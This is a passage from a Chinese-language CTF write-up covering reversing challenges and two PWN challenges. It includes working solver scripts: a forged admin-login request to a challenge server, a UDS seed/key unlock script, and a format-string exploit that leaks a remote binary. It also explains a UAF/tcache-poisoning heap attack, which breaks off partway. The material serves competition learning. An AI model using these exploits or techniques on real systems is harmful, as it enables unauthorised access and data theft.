        for result in pool.imap_unordered(check_chunk, prefixes):
            if result:
                print(f"\n爆破成功!")
                print(f"[+] Flag: {result.decode('ascii')}")
                pool.terminate()
                break
```



---



## 2.MixTielele

这题简单逆向后表面看像普通 Android 登录校验，但实际做下去会发现，真正的登录实现实际被藏到了别的地方。

 `MainActivity` 

界面很简单，就是输入框和登录按钮。
 跟进登录按钮逻辑，会发现它不是直接在 Java 层做判断，而是走了一层加载逻辑：

- 调用某个 `load(this)` 之类的方法
- 去加载 `libflutter.so`

这里存在一个奇怪的文件：

`libflutter.so` 

对这个文件做 `file` 检查，会发现它其实不是 ELF，而是 Zip archive。
 也就是说这个 zip/apk 伪装成了 so 文件。

把它解开后，里面还能看到 dex、manifest、resources 这些标准 APK 结构。

把伪装成 so 的 zip 解包，再去看里面的隐藏 dex。

- `com.example.titlele.OO00OO0OO00O0OO000`
- `com.example.titlele.OO00OO0OOOOO0O00OO`

这里用了接口 + `Proxy` 的方式把真正实现藏起来。

整体调用链大致是：

```
MainActivity.login()
-> 加载隐藏模块
-> get().Login("user")
-> Proxy.invoke()
-> LogInfo("user")
```

继续跟 `LogInfo()`会发现它不是直接把用户名传出去，而是先构造了一个 protobuf 对象，逻辑相当于：

```
builder.setUser(input);
builder.setIsHacker(true);
```

对应的消息大概是：

```
message LoginInfo {
    string user = 1;
    bool isHacker = 2;
}
```

如果输入是 `"admin"`，那么序列化后的 protobuf 字节流就是：

```
0a 05 61 64 6d 69 6e 10 01
```

protobuf 序列化之后，还会经过一层自定义“加密”。

```
seed = 622918
out[i] = in[i] ^ (seed & 0xff)
seed = (1664525 * seed + 1013904223) & 0xffffffff
```

也就是：

- 初始种子固定为 `622918`
- 每个字节和 `seed` 低 8 位异或
- 然后 seed 走一次 LCG 更新

这层做完后再 Base64。

如果按照程序原始逻辑去构造：

```
LoginInfo {
  user = "admin"
  isHacker = true
}
```

加密后 Base64 为：

```
TOgJw7cYctuv
```

拿到上面的 Base64 字符串后，还不会直接发。
程序会继续调用 `libmixtitlele.so` 里的函数。

逆这个 so 可以看出：

1. 随机生成 16 字节 AES key
2. `iv = 00 * 16`
3. 用内置 RSA 公钥加密 AES key
4. 用 AES-CBC-PKCS7 加密前面的 Base64 字符串
5. 打包成 JSON：

```
{"a1":"...","b2":"..."}
```

其中：

- `a1`：RSA 加密后的 AES key，再 Base64
- `b2`：AES-CBC 加密后的密文，再 Base64

接口地址可以在 dex 里直接搜到：

```
http://120.48.104.4:2788/24ab99d75d3327cf3c46/login
```

所以攻击流程为：

```
username
-> protobuf
-> 自定义 XOR/LCG
-> Base64
-> AES-CBC
-> RSA 封装 key
-> POST JSON 到 /login
```

一开始我按程序原逻辑伪造 `admin` 登录包，请求能正常发出，但服务器返回：

```
hacker!!!
```

都呆住了，研究一下，发现：

`builder.setIsHacker(true);`

也就是说我们发给服务端的其实是：

```
LoginInfo {
  user = "admin"
  isHacker = true
}
```

而服务器相当于这样判断：

```
if user != "admin":
    please login as admin
else if isHacker == true:
    hacker!!!
else:
    返回 flag
```

### exp.py

```
import os
import base64
import requests
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad

URL = "http://120.48.104.4:2788/24ab99d75d3327cf3c46/login"

PUBKEY = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAovOZy74DuQ55Nr/mOKROqHjcjVF8V2OrRPEAXz6x61z+jgUBZ6aIFLh3S0/6YSO9/OlWIsrkaJlISCPdrLOjnvSwt6IOiWKVbzcxqyblR8MHbM74Lp7l9T8M9rKqQmjiCFPcbcpyAsABg5CwgthfBo26BIusvptmb+rHXO5kylRHTMbXrBfC5Yagp25M7bCbpg7JqtR4uaaKg9c849+BrvYq5PHtfDMAbUVSCbXG17/lR/1WENQSbPTAgdtmkUvdcwV14iHYIhuspiXnIa/Z5Ze/xekUvwYVk09/pU7T0zSVxR+gRUhNPtKZYiZ/w7alSAVjvGooOSc+ps+7KVCkyQIDAQAB
-----END PUBLIC KEY-----"""

def weird_enc(buf: bytes) -> bytes:
    seed = 622918
    out = bytearray()
    for b in buf:
        out.append((b ^ (seed & 0xff)) & 0xff)
        seed = (1664525 * seed + 1013904223) & 0xffffffff
    return bytes(out)

def inner_login_admin_no_hacker() -> str:
    raw = b"\x0a\x05admin"
    enc = weird_enc(raw)
    return base64.b64encode(enc).decode()

def enc_titlele(s: str) -> dict:
    key = os.urandom(16)
    iv = b"\x00" * 16

    rsa = PKCS1_v1_5.new(RSA.import_key(PUBKEY))
    a1 = base64.b64encode(rsa.encrypt(key)).decode()

    aes = AES.new(key, AES.MODE_CBC, iv)
    b2 = base64.b64encode(aes.encrypt(pad(s.encode(), 16))).decode()

    return {"a1": a1, "b2": b2}

if __name__ == "__main__":
    inner = inner_login_admin_no_hacker()
    print("[*] inner =", inner)   

    body = enc_titlele(inner)
    print("[*] body =", body)

    r = requests.post(URL, json=body, timeout=10)
    print("[*] status =", r.status_code)
    print("[*] text =", r.text)
```



---



## 3.ezLanguage

直接ida搜索程序里的可见字符串，能看到这些关键内容：

- `Input the flag:`
- `Right`

说明程序流程很普通：

1. 读入 flag
2. 做一轮变换
3. 和某个内置目标串比较
4. 相等就输出 `Right`

继续在这些字符串附近看，可以找到两段非常关键的内容。

```
4&ne9h1<y2*$oics-75wk3a0z@6jv8>+bx
```

```
<b<@<72-*8oz*6o-o7co-s73515yk5553<w&znz9640bj&j28++8xh44
```



观察校验逻辑：

设：

- `alpha = "4&ne9h1<y2*$oics-75wk3a0z@6jv8>+bx"`
- 输入字符 ASCII 为 `c`
- 当前位置从 0 开始编号，记为 `i`

先做：

```
q, r = divmod(c, 17)
```

然后输出两个字符：

```
out1 = alpha[(q + i) % 34]
out2 = alpha[33 - ((r + i) % 34)]
```

也就是说每个明文字符都会被编码成两个字符。

### exp.py

```
alpha = "4&ne9h1<y2*$oics-75wk3a0z@6jv8>+bx"
enc = "<b<@<72-*8oz*6o-o7co-s73515yk5553<w&znz9640bj&j28++8xh44"

flag = []
for i in range(len(enc) // 2):
    a = alpha.index(enc[2 * i])
    b = alpha.index(enc[2 * i + 1])

    q = (a - i) % 34
    r = (33 - b - i) % 34
    c = 17 * q + r

    flag.append(chr(c))

print("".join(flag))
```



----



## 4.ezFinger

存在两个目标点：

- `sub_8003498`
- `sub_8000EC0`

分别对应什么函数名，flag 格式为：

```
xmctf{名称1_名称2}
```



先看附件的特征，可以确认应该是 ARM Cortex-M：

- 初始栈：`0x20030000`
- Reset Handler：`0x08000D3C`

反汇编可以看到它一开始访问的是 `0x40023800`：

```
RCC_BASE = 0x40023800
```

函数核心逻辑：

1. 读 `RCC->CFGR` 的 `SWS` 位

2. 判断当前系统时钟来自：

   - HSI
   - HSE
   - PLL

3. 如果来自 PLL，再去读 

   ```
   RCC->PLLCFGR
   ```

   - 取 `PLLM`
   - 取 `PLLN`
   - 取 `PLLP`
   - 判断 PLL 源是 HSI 还是 HSE

4. 最终计算系统时钟频率并返回

在函数尾部的常量池里能看到两个频率：

- `0x00F42400 = 16000000` → **HSI = 16MHz**
- `0x007A1200 = 8000000` → **HSE = 8MHz**

这和 STM32F4 HAL 里的时钟计算逻辑完全一致。

所以关键逻辑大致可以还原为：

```
uint32_t sub_8003498(void)
{
    switch (RCC->CFGR & 0xC)
    {
        case 0x00:
            return 16000000;   // HSI

        case 0x04:
            return 8000000;    // HSE

        case 0x08:
        {
            uint32_t pllm = RCC->PLLCFGR & 0x3F;
            uint32_t plln = (RCC->PLLCFGR >> 6) & 0x1FF;
            uint32_t pllp = ((((RCC->PLLCFGR >> 16) & 0x3) + 1) << 1);

            uint64_t vco;
            if (RCC->PLLCFGR & 0x400000)   // PLL source = HSE
                vco = 8000000ULL * plln / pllm;
            else                           // PLL source = HSI
                vco = 16000000ULL * plln / pllm;

            return vco / pllp;
        }

        default:
            return 16000000;
    }
}
```

查询函数为：

```
HAL_RCC_GetSysClockFreq
```





`sub_8000EC0`

```
sub_8000EC0(pin, value)
```

逻辑一开始先判断：

```
cmp r0, #0x5f
bhi ...
```

说明第一个参数是一个逻辑引脚。



函数会从 `0x08005D4C` 取一个 `int16_t` 表项：

```
ldrsh.w r4, [r3, r0, lsl #1]
cmp.w   r4, #-1
```

说明这是一个 数字引脚号 -> 端口/位号 的映射表，`-1` 表示无效引脚。

表项编码形式明显是：

```
encoded = (port_index << 4) | pin_index
```

因为后面有：

```
ubfx r0, r4, #4, #4   ; 取高 4 位 => port index
and  r4, r4, #0xf     ; 取低 4 位 => pin index
```



接着调用 `sub_8000F64`，它是一个 switch，返回：

- `0x40020000` → GPIOA
- `0x40020400` → GPIOB
- `0x40020800` → GPIOC
- ...
- `0x40022800` → GPIOK

也就是说：

```
GPIO_TypeDef *port = get_GPIOx(port_index);
```



随后：

```
movs r1, #1
lsls r1, r4
uxth r1, r1
```

即：

```
uint16_t mask = 1 << pin_index;
```



最后调用 `sub_800128E`。

而 `sub_800128E` 内部会进一步调用 `sub_800227C`：

```
cbnz r2, ...
lsls r1, r1, #0x10
str  r1, [r0, #0x18]
...
str  r1, [r0, #0x18]
```

这就是 STM32 经典的：

```
if (PinState == GPIO_PIN_RESET)
    GPIOx->BSRR = (uint32_t)GPIO_Pin << 16u;
else
    GPIOx->BSRR = GPIO_Pin;
```

也就是：

```
HAL_GPIO_WritePin(GPIOx, GPIO_Pin, PinState)
```



所以整体逻辑可以还原为：

```
void sub_8000EC0(uint32_t pin, uint32_t value)
{
    if (pin > 0x5F)
        return;

    int16_t encoded = pin_map[pin];
    if (encoded == -1)
        return;

    if (!pin_is_valid(encoded))
        return;

    uint32_t port_index = (encoded >> 4) & 0xF;
    uint32_t pin_index  = encoded & 0xF;

    GPIO_TypeDef *GPIOx = get_GPIOx(port_index);
    uint16_t GPIO_Pin   = (uint16_t)(1 << pin_index);

    HAL_GPIO_WritePin(GPIOx, GPIO_Pin, value ? GPIO_PIN_SET : GPIO_PIN_RESET);
}
```

查询函数名为：

```
digitalWrite
```

所以最终 flag 为：

```
xmctf{HAL_RCC_GetSysClockFreq_digitalWrite}
```



---



## 5.hajimi

- `__main__.py`
- `challenge.pkl.zst`

先看入口脚本:

程序会把 `challenge.pkl.zst` 解压、反序列化，然后组装成一个 `tracr` 编译出来的 Transformer 模型。 

同时它对输入做了两个非常关键的限制：

1. 长度必须正好是*16
2. 每一位只能来自 `1~4`

最后把输入变成 `["BOS"] + list(prompt)` 丢给模型，输出再经过 `decode_output()` 拼成字符串。
 `decode_output()` 就是去掉 `EOS` 后把字符拼起来。



`challenge.pkl.zst` 不是普通权重文件，而是一个由 `tracr` 编译出来的规则模型。
 这类模型是把某个显式规则程序编译成 Transformer。

把 pickle 拆开后，可以看到：

- 输入编码器就是普通 token 编码
- 输出字符集只覆盖 `Grid accepted.` / `Wrong grid.` 这类字符
- 残差标签里有大量 `count_True_3`、`indices`、`sequence_map_x` 之类的名字



结合题目和程序限制：

- 输入长度 16 → 很自然就是一个 `4×4` 的格子
- 元素只能是 `1~4`
- 输出是 `Grid accepted.` / `Wrong grid.`

最终恢复出的通过串是：

```
1234341221434321
```

按 4 位一行写出来就是：

```
1 2 3 4
3 4 1 2
2 1 4 3
4 3 2 1
```

这个结构非常像一个合法的 4×4 布局：

- 每行都是 `1,2,3,4`
- 每列也是 `1,2,3,4`
- 2×2 小块也合法

题目要求提交格式为：

```
xmctf{sha256(16位)}
```

所以直接算：

```
import hashlib
s = "1234341221434321"
print(hashlib.sha256(s.encode()).hexdigest())
```

得到：

```
b0a0d1edc0fb5b75770a5dcbe7b0d4fb08e42fd281a94ee67b405e36056f1df1
```

最终 flag：

```
xmctf{b0a0d1edc0fb5b75770a5dcbe7b0d4fb08e42fd281a94ee67b405e36056f1df1}
```



---



## 6.ez_uds

题目给了一个 UDS 诊断服务，只支持：

- `0x27 01`：请求 Seed
- `0x27 02 <4bytes key>`：发送 Key

并且给了算法

```
def generate_seed():
    return random.randint(0, 0xFFFFFFFF)

def calculate_key(seed):
    key = seed ^ 0xA5A5A5A5
    key = ((key << 3) | (key >> 29)) & 0xFFFFFFFF
    key = (key + 0x12345678) & 0xFFFFFFFF
    return key
```

连接远程后提示：

```
27 01             -> Request Seed
27 02 <4byteskey> -> Send Key
```



搜索后，得到 UDS 的常见流程就是：

1. 客户端发送 `27 01` 请求 Seed
2. 服务端返回 `67 01 <seed>`
3. 客户端根据算法计算 Key
4. 客户端发送 `27 02 <key>`
5. 服务端校验正确后解锁，返回 flag 或成功信息



连接靶机后输入：

```
2701
```

服务端返回：

```
67 01 F6 E4 77 B6
```

- `67`：`27` 的正响应
- `01`：对应子功能 `01`
- 后面 4 个字节：Seed

所以本次的 Seed 为：

```
F6 E4 77 B6
```

即：

```
seed = 0xF6E477B6
```



根据题目给的算法：

```
key = seed ^ 0xA5A5A5A5
key = ((key << 3) | (key >> 29)) & 0xFFFFFFFF
key = (key + 0x12345678) & 0xFFFFFFFF
```

带入 `seed = 0xF6E477B6`：

异或

```
0xF6E477B6 ^ 0xA5A5A5A5 = 0x5341D213
```

循环左移 3 位

```
((0x5341D213 << 3) | (0x5341D213 >> 29)) & 0xFFFFFFFF
= 0x9A0E909A
```

加常数

```
0x9A0E909A + 0x12345678 = 0xAC42E712
```

因此最终 Key 为：

```
AC 42 E7 12
```

发送时写成：

```
2702ac42e712
```



### exp.py

```
from pwn import *
import re

def calc_key(seed):
    key = seed ^ 0xA5A5A5A5
    key = ((key << 3) | (key >> 29)) & 0xFFFFFFFF
    key = (key + 0x12345678) & 0xFFFFFFFF
    return key

io = remote("nc1.ctfplus.cn", 26700)

io.recvuntil(b"Input HEX")
io.sendline(b"2701")

data = io.recvuntil(b"Input HEX", drop=False).decode(errors="ignore")
print(data)

m = re.search(
    r'67\s*01\s*([0-9A-Fa-f]{2})\s*([0-9A-Fa-f]{2})\s*([0-9A-Fa-f]{2})\s*([0-9A-Fa-f]{2})',
    data,
    re.I
)

if not m:
    print("[-] failed to parse seed")
    io.close()
    exit()

seed_hex = ''.join(m.groups())
seed = int(seed_hex, 16)
key = calc_key(seed)

print(f"[+] seed = {seed:08X}")
print(f"[+] key  = {key:08X}")

payload = f"2702{key:08x}".encode()
print(f"[+] send = {payload.decode()}")

io.sendline(payload)
io.interactive()
```



---



## 7.Disguise

双层

第一层 `Disguise.exe` 表面上会让你输入一个“flag”，但实际是假校验。
真正的逻辑被藏在程序 `.data` 里，运行时会还原出第二个 PE，再由第二个 PE 完成真正的 flag 校验。



先静态看外层程序，能看到一段明显的输入校验逻辑：

- 读取输入
- 对输入逐字节做处理
- 和一段常量比较

关键比较可以概括成：

```
for (i = 0; i < len; i++) {
    if ((input[i] - i) != enc[i]) fail;
}
```

也就是：

```
input[i] = enc[i] + i
```

把那段常量还原出来后得到：

```
This is a fake flag
```

所以是flag不在这。



继续看外层源码，会发现还有一段代码不是在做输入比较，而是在“解码一大块数据”。

它的行为大致是：

- 从某个地址读出长度
- 从 `.data` 里每隔 4 字节取 1 个低字节
- 再异或 `0x07`
- 拼成完整文件

逻辑可以写成：

```
out[i] = data[base + i*4] ^ 7
```

长度在：

```
VA = 0x470000
size = 0x15000
```

数据起点在：

```
VA = 0x41C000
```

提取脚本：

```
import struct

with open("Disguise.exe", "rb") as f:
    data = f.read()

IMAGE_BASE = 0x400000
SECTIONS = [
    ('.textbss', 0x401000, 0x000000, 0x10000),
    ('.text',    0x411000, 0x000400, 0x768e),
    ('.rdata',   0x419000, 0x007c00, 0x2499),
    ('.data',    0x41c000, 0x00a200, 0x65000),
    ('.idata',   0x482000, 0x06f200, 0x0ba2),
    ('.msvcjmc', 0x483000, 0x06fe00, 0x0300),
    ('.00cfg',   0x484000, 0x070200, 0x010e),
    ('.rsrc',    0x485000, 0x070400, 0x043c),
    ('.reloc',   0x486000, 0x070a00, 0x0a9d),
]

def va2off(va):
    for _, vma, off, size in SECTIONS:
        if vma <= va < vma + size:
            return off + (va - vma)
    return None

size = struct.unpack_from("<I", data, va2off(0x470000))[0]

payload = bytearray()
base = va2off(0x41C000)
for i in range(size):
    payload.append(data[base + i * 4] ^ 7)

with open("payload.exe", "wb") as f:
    f.write(payload)

print("done, size =", hex(size))
```

跑完后会得到第二个程序 `payload.exe`。

直接搜索程序，可以看到一些关键字符串：

```
Please enter your flag
Wrong flag
Correct flag
We1c0me_t0_xmctf
```

很明显：

- `We1c0me_t0_xmctf` 很像 key
- 程序会读取一串输入，然后进行真正校验

进一步分析后发现：

- 输入长度要求是 48 字节
- 输入被分成 3 个 16-byte block
- 程序内部不是直接写普通算法，而是塞进了一个自定义 VM
- 这个 VM 本质上实现的是一个魔改 SM4

VM 指令流在 `.data` 里，执行完后会把结果和固定密文比较。

继续看数据区，有几组非常关键的常量：

sbox位于：

```
0x41EC30
```

标准 SM4 SBox 循环左移 0xB6 位后的结果

CK位于：

```
0x41F030
```

这组就是标准 SM4 的 `CK`

FK位于：

```
0x422010
```

自定义成了：

```
FK = [
    0x12345678,
    0x9abcdef0,
    0xfedcba98,
    0x87654321
]
```

key位于：

```
0x421000
```

```
We1c0me_t0_xmctf
```

比较用的密文位于：

```
0x421018
```

总共 12 个 dword，对应 48 字节输入加密后的结果。



### exp.py

```
import struct

with open("payload.exe", "rb") as f:
    data = f.read()

IMAGE_BASE = 0x400000
SECTIONS = [
    ('.textbss', 0x401000, 0x000000, 0x10000),
    ('.text',    0x411000, 0x000400, 0xC484),
    ('.rdata',   0x41E000, 0x00CA00, 0x2F39),
    ('.data',    0x421000, 0x00FA00, 0x2C00),
    ('.idata',   0x427000, 0x012600, 0x1449),
]

def va2off(va):
    rva = va - IMAGE_BASE
    for _, vma, off, size in SECTIONS:
        if vma <= va < vma + size:
            return off + (va - vma)
    raise ValueError(hex(va))

def dwords(va, n):
    off = va2off(va)
    return list(struct.unpack_from("<%dI" % n, data, off))

S_raw = dwords(0x41EC30, 256)
SBOX  = [x & 0xff for x in S_raw]
CK    = dwords(0x41F030, 32)
FK    = dwords(0x422010, 4)
MK_le = dwords(0x421000, 4)
CT    = dwords(0x421018, 12)

MK = [int.from_bytes(struct.pack("<I", w), "big") for w in MK_le]

def rotl(x, n):
    return ((x << n) & 0xffffffff) | (x >> (32 - n))

def tau(x):
    return (
        (SBOX[(x >> 24) & 0xff] << 24) |
        (SBOX[(x >> 16) & 0xff] << 16) |
        (SBOX[(x >> 8)  & 0xff] << 8 ) |
        (SBOX[x & 0xff])
    )

def L(x):
    return x ^ rotl(x, 2) ^ rotl(x, 10) ^ rotl(x, 18) ^ rotl(x, 24)

def L2(x):
    return x ^ rotl(x, 13) ^ rotl(x, 23)

def key_schedule(MK):
    K = [MK[i] ^ FK[i] for i in range(4)]
    rk = []
    for i in range(32):
        t = K[(i+1)%4] ^ K[(i+2)%4] ^ K[(i+3)%4] ^ CK[i]
        K[i%4] = (K[i%4] ^ L2(tau(t))) & 0xffffffff
        rk.append(K[i%4])
    return rk

def crypt_words(inp_words, rks):
    X = list(inp_words)
    for i in range(32):
        t = X[(i+1)%4] ^ X[(i+2)%4] ^ X[(i+3)%4] ^ rks[i]
        X[i%4] = (X[i%4] ^ L(tau(t))) & 0xffffffff
    return [X[3], X[2], X[1], X[0]]

rk = key_schedule(MK)

pt = b""
for i in range(0, 12, 4):
    block_ct = CT[i:i+4]
    block_pt_words = crypt_words(block_ct, rk[::-1])   # 逆轮密钥解密
    for w in block_pt_words:
        pt += w.to_bytes(4, "big")

print(pt.decode())
```



---



## 8.Hulua

字符串区里同时出现了 `hulua`、`Please enter the flag:`、`user_input`、`check`，以及完整的 `Lua 5.3.6` 版本字符串.

说明它会把输入塞进 Lua 环境，再执行一个名为 `check` 的块来判断是否正确。



这题分两层：

1. 把 `.data` 段里的一段数据用 `"hulua"` 循环异或隐藏。
2. 异或还原后得到一个正常的 Lua 5.3 字节码 chunk，再用 `luac -l -l` 反汇编分析校验逻辑。



在data数据段可以看见：

- 数据起始地址：`unk_140033000`
- `.data` 段文件偏移：`0x31A00`
- 校验数据长度：`dword_1400333DC = 0x3DC`
- `.rdata` 里有字符串 `hulua`

结合反编译可以知道，程序对这 `0x3DC` 字节做：

```
byte_140033000[i] ^= aHulua[i % 5];
```



直接从文件偏移 `0x31A00` 读出 `0x3DC` 字节，然后与 `b"hulua"` 循环异或：

```
key = b"hulua"

with open("Hulua.exe", "rb") as f:
    f.seek(0x31A00)
    enc = f.read(0x3DC)

dec = bytes(b ^ key[i % len(key)] for i, b in enumerate(enc))

with open("decoded.luac", "wb") as f:
    f.write(dec)

print(dec[:32].hex())
```

异或后文件头会变成：

```
1b4c7561530019930d0a1a0a0408040808785600...
```

这就是标准的 Lua 5.3 precompiled chunk 头。



```
luac -l -l decoded.luac
```

主函数里有 5 个关键常量：

1. `"78 6D 63 74 66 32 30 32 36"`
2. `"8B 8B 77 BE 68 61 86 68 E5 63 EE 84 35 6F 58 C8 51 0F 6E 94 70 E7 26 90 B6 75 EC 28 AF 14 E2 E3"`
3. `"user_input"`
4. `nil`
5. `32`

而且主函数会取两个闭包，再读取 `user_input`，最后返回布尔值。

从这个主函数可以很自然地看出：

- `user_input` 是输入
- 长度要求是 `32`
- 两个闭包分别用于：
  - 十六进制字符串转字节串
  - 核心加解密 / 校验逻辑

在第二个闭包里能看到：

- 初始字符串 `""`
- `string.gmatch`
- 模式 `"%x+"`
- `string.char`
- `tonumber`

这基本就是把带空格的十六进制字符串切出来，再逐个转成字节。

所以：

```
"78 6D 63 74 66 32 30 32 36" -> b"xmctf2026"
```



第一个闭包里能看到这些常量：

- `255`
- `256`
- `102`
- `string.byte`
- `table.insert`
- `string.char`
- `table.concat`

再结合它的大体结构：

- 先初始化 0~255 的表
- 再做 swap
- 再按字节生成输出

看起来像rc4



可将逻辑还原为下面这种伪代码：

```
local ok = true
local key_hex = "78 6D 63 74 66 32 30 32 36"
local ct_hex  = "8B 8B 77 BE 68 61 86 68 E5 63 EE 84 35 6F 58 C8 51 0F 6E 94 70 E7 26 90 B6 75 EC 28 AF 14 E2 E3"

local rc4_like = ...
local hex2bin  = ...

if not user_input then
    return false
end

if #user_input ~= 32 then
    return false
end

local key = hex2bin(key_hex)
local out = rc4_like(key, user_input)
local target = hex2bin(ct_hex)

if out == target then
    return true
else
    return false
end
```

也可以等价地反过来算：

```
user_input = RC4(key, ct) ^ 0x66
```

其中：

```
key = b"xmctf2026"
ct  = bytes.fromhex("8B 8B 77 BE ... E2 E3")
```

### exp.py

```
from binascii import unhexlify

key = bytes.fromhex("78 6D 63 74 66 32 30 32 36")
ct  = bytes.fromhex("8B 8B 77 BE 68 61 86 68 E5 63 EE 84 35 6F 58 C8 51 0F 6E 94 70 E7 26 90 B6 75 EC 28 AF 14 E2 E3")

def rc4(key, data):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0
    out = bytearray()
    for b in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        out.append((b ^ k) ^ 0x66)
    return bytes(out)

print(rc4(key, ct).decode())
```



---

---

---



# PWN

## 1.ez-nc

格式化字符串漏洞

程序在读取用户输入后，直接将其作为 `snprintf(path, 0x58, buf)` 的参数，导致用户可控格式化字符串。

小限制：

- **长度限制**：通过 `fgets(buf, 8, stdin)` 读取，最多只有 7 个字节。

- **黑名单过滤**：过滤了 `"ez-nc"`、`"proc"` 和 `"%c"`。

  

Payload 构造：使用 `%99$s`。

- **绕过黑名单**：不包含被过滤的关键字。
- **满足长度**：仅占 5 个字节，完美符合 <= 7 字节的限制。
- **内存泄露**：`%99$s` 将栈上第 99 个参数作为指针，并以字符串形式打印。在实际动态测试中，该指针恰好指向内存中的程序本体。



由于通过 `%99$s` 直接把整个 ELF 二进制文件打印到了终端，秩序

1. **定位文件头**：在返回的杂乱数据中寻找 `\x7fELF` 标志作为文件开头。
2. **定位文件尾**：找到最后一个交互提示符 `Enter the filename to download:`，其前面的部分即为文件结尾。
3. **静态分析**：将截取出的完整二进制数据保存为文件，直接在其中使用字符串匹配就可以提取明文 Flag `polarisctf{...}`。



### payload：

```
import re
import socket
from pathlib import Path

HOST = "nc1.ctfplus.cn"
PORT = xxxx
PROMPT = b"Enter the filename to download: "


def recv_until_prompt(sock: socket.socket, timeout: float = 1.2) -> bytes:
    sock.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = sock.recv(65535)
            if not chunk:
                break
            data += chunk
            if data.endswith(PROMPT):
                break
    except Exception:
        pass
    return data


def fetch_with_payload(payload: bytes) -> bytes:
    s = socket.create_connection((HOST, PORT), timeout=3)
    try:
        _ = recv_until_prompt(s)
        s.sendall(payload + b"\n")
        return recv_until_prompt(s)
    finally:
        s.close()


def find_elf_offset(max_idx: int = 200) -> int:
    """
    Service input is only 7 useful bytes (fgets(buf, 8,...)).
    So we only test format payloads whose length <= 7.
    """
    for i in range(1, max_idx + 1):
        p = f"%{i}$s".encode()
        if len(p) > 7:
            continue
        out = fetch_with_payload(p)
        if b"\x7fELF" in out:
            return i
    raise RuntimeError("No usable %i$s offset found")


def recover_elf(raw: bytes) -> bytes:
    start = raw.find(b"\x7fELF")
    end = raw.rfind(PROMPT)
    if start == -1 or end == -1 or end <= start:
        raise RuntimeError("ELF boundary parse failed")
    return raw[start:end]


def extract_flag_from_binary(binary: bytes) -> str:
    m = re.search(rb"polarisctf\{[^}]+\}", binary)
    if not m:
        raise RuntimeError("flag pattern not found in binary")
    return m.group(0).decode()


def main() -> None:
    preferred = [99]
    idx = None
    raw = b""

    print("[+] trying known offsets first ...", flush=True)
    for guess in preferred:
        out = fetch_with_payload(f"%{guess}$s".encode())
        if b"\x7fELF" in out:
            idx = guess
            raw = out
            break

    if idx is None:
        print("[+] fallback: scanning %i$s offset ...", flush=True)
        idx = find_elf_offset()
        raw = fetch_with_payload(f"%{idx}$s".encode())

    print(f"[+] found offset: {idx}", flush=True)
    print(f"[+] downloading binary via payload: %{idx}$s", flush=True)

    elf = recover_elf(raw)
    out = Path("ez-nc")
    out.write_bytes(elf)
    print(f"[+] saved: {out.resolve()} ({len(elf)} bytes)", flush=True)

    flag = extract_flag_from_binary(elf)
    print(f"[+] flag: {flag}", flush=True)


if __name__ == "__main__":
    main()
```



---



## 2.ezheap

这题本质上是一道结合了 UAF + tcache poisoning + safe-linking 绕过 的堆题。

程序内部维护了一组 `task descriptor` 和 `session` 对象。

正常情况下，`dispatch` 会在 strict policy 开启时校验 handler 是否属于白名单；

1. 先把 `strict_policy` 清零；
2. 再把 `task0->handler` 改成 `diag.audit_sink`；
3. 最后通过 `dispatch(task0)` 进入审计逻辑，直接打印 flag。、



动态分析，发现漏洞点：

 `option6` 存在 UAF，`option6` 会回收指定 `session`，本质上就是 `free(session_chunk)`，但是程序实际上并没有把槽位中的指针清空。

这样就导致：

- chunk 已经进入 tcache
- 但程序侧仍然保留这个 `session*`
- 后续还能继续对这个“已释放对象”操作



`option7` 存在限制：

- 只能对 inactive 的 session 操作
- 只能写 `qword_index = 0`

也就是说，只能改：

```
*(uint64_t *)(session_ptr + 0x00)
```

因为 chunk 被 free 进入 tcache 后，其用户区起始位置会被 glibc 当作 tcache 单链表节点使用，首 qword 就是 `fd` 指针。

所以：

- `option6` 负责把 chunk 丢进 tcache
- `option7` 负责篡改 tcache 链表头部的 `fd`

这就把 UAF 直接变成了任意 tcache 链投毒。



题目核心执行点在 `option9`。

程序会从全局状态中取出任务描述符，大致结构如下：

- `desc = state + 0x28 + idx * 8`
- `handler` 位于 `desc + 0x18`
- `ctx` 位于 `desc + 0x20`

在执行 dispatch 时：

- 如果 `strict_policy == 1`，则只允许调用白名单函数
- 如果 `strict_policy == 0`，则可调用任意 handler

因此整个攻击的关键目标只有两个：

1. 把 `strict_policy` 变成 `0`
2. 把 `task0->handler` 改成 `diag.audit_sink`



题目本身给了接口：

`option4` ：

- `queue_ctrl`
- `strict_policy`
- 每个 task 的：
  - `desc`
  - `handler`
  - `ctx`

输出里能直接看到类似：

```
queue_ctrl=0x... strict_policy=1 healthy=1
[task:0] desc=0x... handler=0x... ctx=0x...
```

`option10` ：

- `scheduler.ctrl`
- `diag.postproc_default`
- `diag.audit_sink`
- 当前各个 session 的 handle

输出类似：

```
scheduler.ctrl=0x... strict_policy=1
diag.postproc_default=0x... diag.audit_sink=0x...
[session:0] handle=0x...
```

基本上所有的利用地址都给了，不需要做其他信息搜集。



`option5` 会执行一次 `malloc(0x50)` 分配 session 结构，并完成初始化。关键写入大致如下：

- `session + 0x00`：slot / tensor_bytes 打包值
- `session + 0x08`：payload 指针
- `session + 0x10`：`snprintf("%s", alias)` 写入 alias
- `session + 0x30`：计数值
- `session + 0x38`：默认后处理函数

这一点极其重要，因为如果我们能把 `malloc(0x50)` 的返回位置伪造到某个任意可写地址附近，那么 `option5` 初始化时的这些写操作就会变成我们的攻击指令：



glibc 的 tcache safe-linking 会对链表指针做编码。伪造 `fd` 时，需要写入：

```
fd_encoded = target ^ (chunk_addr >> 12)
```

其中：

- `target` 是希望下一次 tcache 分配命中的目标地址
- `chunk_addr` 是当前被投毒 chunk 的地址

只要写入编码后的 `fd`，下一次 tcache 出链时就会把链表跳转到 `target`。



因此，推出总的攻击流程：

1. **Stage 1：把 `strict_policy` 清零**
2. **Stage 2：把 `task0->handler` 改成 `audit_sink`**
3. **Stage 3：dispatch 触发读 flag**



这一阶段的目标是让一次 `malloc(0x50)` 落到 `scheduler.ctrl` 附近，从而借助 `option5` 的初始化把 `strict_policy` 清成 0。

先申请两个正常 session：

- `slot0`
- `slot1`

然后依次回收：

- `free(slot0)`
